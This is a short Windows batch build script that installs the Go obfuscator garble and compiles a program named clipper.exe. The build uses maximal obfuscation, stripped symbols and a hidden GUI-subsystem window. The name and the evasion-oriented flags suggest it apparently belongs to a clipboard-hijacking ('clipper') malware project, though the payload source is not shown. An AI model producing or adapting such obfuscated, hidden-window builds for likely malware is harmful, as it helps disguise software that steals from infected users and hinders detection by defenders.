@echo off

cls

title Installing...
go install mvdan.cc/garble@latest

cls

title Building...
garble -tiny build -ldflags="-s -w -H=windowsgui" -o clipper.exe

cls

title Success!

echo Success builded!.. Build available at .\clipper.exe

pause